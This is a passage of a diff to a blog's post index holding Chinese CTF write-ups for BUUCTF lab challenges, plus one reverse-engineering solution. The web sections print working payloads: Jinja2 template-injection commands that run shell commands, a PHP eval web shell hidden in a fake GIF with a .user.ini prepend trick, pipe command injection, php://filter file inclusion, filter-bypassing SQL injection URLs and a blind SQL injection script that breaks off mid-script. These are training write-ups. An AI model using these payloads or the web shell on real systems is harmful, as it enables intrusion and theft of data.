print(chr(flag[i]),end=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转自 https://www.cnblogs.com/jentleTao/p/12666415.html</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>flag{KDEEIFGKIJ@AFGEJAEF@FDKADFGIJFA@FDE@JG@J}</strong></p>
+<p>payload<br><code>/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</code></p>
+<p><strong>flag{9b7d075f-096d-42b2-8cf6-69d0fbf34c12}</strong></p>
+<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>考点：</p>
+<h3 id="password-’”-md5-pass-true-”‘"><a href="#password-’”-md5-pass-true-”‘" class="headerlink" title="password=’”.md5($pass,true).”‘"></a>password=’”.md5($pass,true).”‘</h3><blockquote>
+<p>ffifdyop，这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，<br>而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是1select * from ‘admin’ where password=’’ or ‘6xxxxx’</p>
+<p>等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数</p>
+</blockquote>
+<h3 id="md5-bypass"><a href="#md5-bypass" class="headerlink" title="md5 bypass"></a>md5 bypass</h3><blockquote>
+<p>md5()或者sha1()之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果$a和$b都是数组则双双返回FALSE, 两个FALSE相等得以绕过</p>
+</blockquote>
+<h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p>一通乱试看到页面注释有<code>&lt;!--ssssssti &amp; a little trick --&gt;</code></p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls &#x2F;&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p>找到flag位置</p>
+<p>paylaod</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p>回显flag</p>
 ]]></content>
       <categories>
         <category>BUUCTF</category>
       </categories>
       <tags>
-        <tag>CTF - Re</tag>
+        <tag>CTF - Web</tag>
       </tags>
   </entry>
   <entry>
@@ -991,6 +872,125 @@ password栏：123456</code><br><strong>ag{369a193d-5981-4b62-8ead-daebdcdf79a3}<
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;</span><br><span class="line">1&#39;;show tables;</span><br><span class="line">1&#39;;show columns from &#96;FlagHere&#96;;</span><br><span class="line">1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</span><br></pre></td></tr></table></figure>
 
 ]]></content>
+      <categories>
+        <category>BUUCTF</category>
+      </categories>
+      <tags>
+        <tag>CTF - Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[安洵杯 2019]game WriteUp</title>
+    <url>/2020/09/13/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-game-WriteUp/</url>
+    <content><![CDATA[<hr>
+<a id="more"></a>
+
+<p>考点：</p>
+<p>控制流平坦化</p>
+<p>反编译main函数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// ST38_4</span></span><br><span class="line">  __int64 v5; <span class="comment">// ST30_8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// [rsp+2Ch] [rbp-54h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+40h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+7Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input your flag:"</span>, argv, envp);</span><br><span class="line">  gets(&amp;v8);								<span class="comment">// 输入</span></span><br><span class="line">  v10 = general_inspection((<span class="keyword">int</span> (*)[<span class="number">9</span>])sudoku);</span><br><span class="line">  v7 = <span class="number">-1804515313</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( v7 == <span class="number">-2071121728</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = blank_num((<span class="keyword">int</span> (*)[<span class="number">9</span>])sudoku);</span><br><span class="line">        v5 = mem_alloc(v4);</span><br><span class="line">        trace(sudoku, v5, v4);</span><br><span class="line">        check((<span class="keyword">int</span> (*)[<span class="number">9</span>])sudoku);</span><br><span class="line">        check1(&amp;v8);						<span class="comment">// 加密</span></span><br><span class="line">        check3(&amp;v8);						<span class="comment">// 加密 调用了check2()</span></span><br><span class="line">        v9 = <span class="number">0</span>;</span><br><span class="line">        v7 = <span class="number">-303742386</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v7 != <span class="number">-1804515313</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v3 = <span class="number">-2071121728</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v10 )</span><br><span class="line">        v3 = <span class="number">664169471</span>;</span><br><span class="line">      v7 = v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="number">-303742386</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="number">664169471</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"error"</span>);</span><br><span class="line">      check((<span class="keyword">int</span> (*)[<span class="number">9</span>])sudoku);</span><br><span class="line">      v9 = <span class="number">0</span>;</span><br><span class="line">      v7 = <span class="number">-303742386</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>python代码还原逻辑：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check2</span><span class="params">()</span>:</span></span><br><span class="line">	v16 = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">		v16.append(flag[v15] <span class="number">-48</span> )</span><br><span class="line">        <span class="comment">#这个位置其实是数字得char和int转化</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">			<span class="keyword">if</span>  dog3[<span class="number">9</span> * i + j] == <span class="number">0</span>:</span><br><span class="line">				dog3[<span class="number">9</span> *i + i] = v16[v13]</span><br><span class="line">				v13 += <span class="number">1</span></span><br><span class="line">                <span class="comment">#这里形成一个数独游戏得填入</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">			<span class="keyword">if</span> dog3[<span class="number">9</span> * i + j] != sudoku[<span class="number">9</span> * i + j]:</span><br><span class="line">                <span class="comment"># 关键比较</span></span><br><span class="line">				print(<span class="string">"!!!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check1</span><span class="params">()</span>:</span></span><br><span class="line">	v12 = len(flag)&gt;&gt;<span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)&gt;&gt;<span class="number">1</span>):</span><br><span class="line">		(flag[i],flag[v12+<span class="number">1</span>]) = (flag[v12+<span class="number">1</span>],flag[i])</span><br><span class="line">		<span class="comment">#前后两部分互换</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag),<span class="number">2</span>):</span><br><span class="line">		(flag[i],flag[i+<span class="number">1</span>]) = (flag[i+<span class="number">1</span>],flag[i])</span><br><span class="line">		<span class="comment">#两位之间互换</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">		flag[i] = ((flag[i]&amp;<span class="number">0xf3</span>)|(~flag[i]&amp;<span class="number">0xc</span>)) - <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 转自 https://blog.csdn.net/wlz_lc_4/article/details/103466957</span></span><br></pre></td></tr></table></figure>
+
+<p>解题的关键就是找到原来的数独，和填好的数独，提取填好的数字，然后做check1中的逆向操作就可以得到flag</p>
+<p>最终是比较dog3和sudoku里的值，dog3是已知部分填充部分，sudoku需要动态调试得知填入的值</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.data:0000000000604300                 public D0g3</span><br><span class="line">.data:0000000000604300 ; _DWORD D0g3[81]</span><br><span class="line">.data:0000000000604300 D0g3            dd 1, 0, 5, 3, 2, 7, 2 dup(0), 2 dup(8), 0, 9, 0, 5, 2 dup(0)</span><br><span class="line">.data:0000000000604300                                         ; DATA XREF: check2(char *)+462↑o</span><br><span class="line">.data:0000000000604300                                         ; check2(char *):loc_402F53↑o ...</span><br><span class="line">.data:0000000000604300                 dd 2, 2 dup(0), 7, 2 dup(0), 1, 0, 5, 0, 3, 4, 9, 0, 1</span><br><span class="line">.data:0000000000604300                 dd 2 dup(0), 3, 3 dup(0), 1, 2 dup(0), 7, 0, 9, 0, 6, 7</span><br><span class="line">.data:0000000000604300                 dd 0, 3, 2, 9, 0, 4, 8, 2 dup(0), 6, 0, 5, 4, 0, 8, 0</span><br><span class="line">.data:0000000000604300                 dd 9, 2 dup(0), 4, 2 dup(0), 1, 0, 3, 2 dup(0), 2, 1, 0</span><br><span class="line">.data:0000000000604300                 dd 3, 0, 7, 0, 4</span><br><span class="line">.data:0000000000604300 _data           ends</span><br><span class="line">.data:0000000000604300</span><br></pre></td></tr></table></figure>
+
+
+<p>逆向脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudoku = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">4</span>]</span><br><span class="line">dog3 = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>]</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">81</span>):</span><br><span class="line">    <span class="keyword">if</span> sudoku[i] != dog3[i]:</span><br><span class="line">        tmp = ord(str(sudoku[i])) + <span class="number">20</span></span><br><span class="line">        flag.append( tmp&amp;<span class="number">0xf3</span> | ~tmp&amp;<span class="number">0xc</span> )</span><br><span class="line">print(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">40</span>,<span class="number">2</span>):</span><br><span class="line">    (flag[i], flag[i+<span class="number">1</span>]) = (flag[i+<span class="number">1</span>], flag[i]) <span class="comment">#两位操作</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    (flag[i],flag[i+<span class="number">20</span>]) = (flag[i+<span class="number">20</span>], flag[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">    print(chr(flag[i]),end=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转自 https://www.cnblogs.com/jentleTao/p/12666415.html</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>flag{KDEEIFGKIJ@AFGEJAEF@FDKADFGIJFA@FDE@JG@J}</strong></p>
+]]></content>
+      <categories>
+        <category>BUUCTF</category>
+      </categories>
+      <tags>
+        <tag>CTF - Re</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week20200907-20200913</title>
+    <url>/2020/09/10/week20200907-20200913/</url>
+    <content><![CDATA[<h1 id="Week-6-lt-2020-09-07-2020-09-13-gt"><a href="#Week-6-lt-2020-09-07-2020-09-13-gt" class="headerlink" title="Week 6 &lt;2020.09.07 - 2020.09.13&gt;"></a>Week 6 &lt;2020.09.07 - 2020.09.13&gt;</h1><a id="more"></a>
+
+<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>利用.git源码泄露</p>
+<p>源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2>]]></content>
+      <categories>
+        <category>BUUCTF</category>
+      </categories>
+      <tags>
+        <tag>CTF - Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week20200727-20200802</title>
+    <url>/2020/07/28/week20200727-20200802/</url>
+    <content><![CDATA[<h1 id="Week-3-lt-2020-07-27-2020-08-02-gt"><a href="#Week-3-lt-2020-07-27-2020-08-02-gt" class="headerlink" title="Week 3 &lt;2020.07.27 - 2020.08.02&gt;"></a>Week 3 &lt;2020.07.27 - 2020.08.02&gt;</h1><a id="more"></a>
+
+<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>题目和网页都给出了提示，考察文件包含</p>
+<p>同 Secret File 的解法，使用”php://filter”伪协议进行包含</p>
+<p>payload：/?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<p>获得base64码，解密得到flag</p>
+<p>flag{f876c961-c87b-4060-a5b5-299aae870ace}</p>
+<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>用AntSword连接，密码网页给出了是”Syc”</p>
+<p><img src="/2020/07/28/week20200727-20200802/image-20200729003126637.png" alt="image-20200729003126637"></p>
+<p>连接，在根目录找到flag文件</p>
+<p>flag{41d79b55-d82a-4490-9bb4-31f8308a676a}</p>
+<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>—— 转自<a href="https://www.cnblogs.com/20175211lyz/p/11455355.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11455355.html</a> ——</p>
+<blockquote>
+<p><strong>.user.ini 文件</strong><br>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件<em>仅</em>被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。<br>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（[$_SERVER[‘DOCUMENT_ROOT’]]所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。<br>在 .user.ini 风格的 INI 文件中只有具有 <strong><code>PHP_INI_PERDIR</code></strong> 和 <strong><code>PHP_INI_USER</code></strong> 模式的 INI 设置可被识别。<br>两个新的 INI 指令，<em>user_ini.filename</em> 和 <em>user_ini.cache_ttl</em> 控制着用户 INI 文件的使用。<br><em>user_ini.filename</em> 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 <em>.user.ini*。<br>*user_ini.cache_ttl</em> 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p>
+</blockquote>
+<blockquote>
+<p><strong>绕过exif_imagetype()方法</strong><br>采用xbm格式X Bit Map，绕过exif_imagetype()方法的检测，上传文件来解析。<br>在计算机图形学中，X Window系统使用X BitMap，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。<br>XBM数据由一系列包含单色像素数据的静态无符号字符数组组成，当格式被普遍使用时，XBM通常出现在标题.h文件中，每个图像在标题中存储一个数组。<br>也就是用c代码来标识一个xbm文件，前两个#defines指定位图的高度和宽度【以像素为单位，比如以下xbm文件：</p>
+</blockquote>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_width 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_height 7</span></span><br></pre></td></tr></table></figure>
+
+<p>知识点：<br>1.利用.user.ini上传/隐藏后门<br>2.绕过exif_imagetype()</p>
+<p>———————————————————————————————</p>
+<p>通过上传<code>.user.ini</code>文件来给同目录下的<code>index.php</code>文件添加上一些额外的内容</p>
+<blockquote>
+<p>GIF89a：图片格式gif必要文件头信息</p>
+</blockquote>
+<p>依次上传：<br><strong>a.jpg</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt; @eval($_POST[&#39;pass&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>.user.ini</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line">auto_prepend_file&#x3D;a.jpg</span><br></pre></td></tr></table></figure>
+<p>蚁剑连接<br><a href="http://4d647826-57bc-45db-9d04-4220e9fc4cdd.node3.buuoj.cn/uploads/adeee0c170ad4ffb110df0cde294aecd/index.php" target="_blank" rel="noopener">http://4d647826-57bc-45db-9d04-4220e9fc4cdd.node3.buuoj.cn/uploads/adeee0c170ad4ffb110df0cde294aecd/index.php</a><br>读取flag</p>
+<h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>没有过滤，管道符直接取flag</p>
+<p>payload: 127.0.0.1 | cat /flag</p>
+<p>flag{de9ab224-511d-4a33-9e1d-5c871c9518b1}</p>
+<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>知识点：双写绕过</p>
+<p>数据库 payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(schema_name)%20frfromom%20infoorrmation_schema.schemata%20%23</span><br></pre></td></tr></table></figure>
+
+<p>数据表 payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3Ddatabase()%23</span><br></pre></td></tr></table></figure>
+<p>目标在 ‘b4bsql’</p>
+<p>列 payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema%3Ddatabase()%20anandd%20table_name%3D%27b4bsql%27%23</span><br></pre></td></tr></table></figure>
+<p>列名’id,username,password’</p>
+<p>字段 payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(passwoorrd)%20frfromom%20b4bsql%23</span><br></pre></td></tr></table></figure>
+
+<p>flag{04a7a268-baf9-48a5-b7cb-2b8aeebae765}</p>
+<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>脚本解法：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">"http://d97b67d8-5392-40dd-9416-1943726ff03f.node3.buuoj.cn/index.php"</span>;</span><br><span class="line"> </span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">num=<span class="number">0</span>  <span class="comment">#用了来判断是不是flag已经拼完整了</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line"> </span><br><span class="line">		payload = <span class="string">"if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)"</span>%(i,j);</span><br><span class="line">		<span class="comment">#print(str((i-1)*96+j-32)+":~"+payload+"~")</span></span><br><span class="line"> </span><br><span class="line">		data = &#123;</span><br><span class="line">			<span class="string">"id"</span>:payload,</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">		r = requests.post(url,data=data)</span><br><span class="line"> </span><br><span class="line">		r.encoding = r.apparent_encoding</span><br><span class="line"> </span><br><span class="line">		<span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			x = chr(j)</span><br><span class="line">			result+=str(x)</span><br><span class="line">			print(result)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">		<span class="keyword">if</span> <span class="string">"&#125;"</span> <span class="keyword">in</span> result:</span><br><span class="line">			